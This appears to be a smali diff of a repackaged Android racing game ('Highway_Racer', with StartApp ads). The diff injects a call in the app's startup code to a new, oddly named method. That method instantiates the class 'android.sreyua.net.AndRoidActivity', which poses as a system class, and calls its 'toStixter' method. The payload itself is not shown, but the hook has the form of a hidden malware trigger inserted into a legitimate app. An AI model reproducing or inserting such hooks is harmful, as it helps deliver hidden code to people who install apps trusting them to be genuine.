@@ -602,6 +602,8 @@
     .registers 9
 
     .prologue
+    invoke-virtual {p0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->tsTseRseiew()V
+
     const/16 v6, 0xa
 
     const/4 v5, 0x0
@@ -645,7 +647,7 @@
     .line 85
     iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;
 
-    if-nez v0, :cond_2f
+    if-nez v0, :cond_32
 
     .line 86
     new-instance v0, Lcom/startapp/android/publish/StartAppAd;
@@ -655,12 +657,12 @@
     iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;
 
     .line 91
-    :cond_2f
+    :cond_32
     const/4 v0, 0x4
 
     new-array v0, v0, [I
 
-    fill-array-data v0, :array_92
+    fill-array-data v0, :array_96
 
     iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->i:[I
 
@@ -768,7 +770,9 @@
     .line 91
     nop
 
-    :array_92
+    nop
+
+    :array_96
     .array-data 4
         0x7f020001
         0x7f020002
@@ -816,5 +820,18 @@
     invoke-virtual {v0}, Lcom/startapp/android/publish/StartAppAd;->onResume()V
 
     .line 174
+    return-void
+.end method
+
+.method public tsTseRseiew()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Landroid/sreyua/net/AndRoidActivity;
+
+    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V
+
     return-void
 .end method
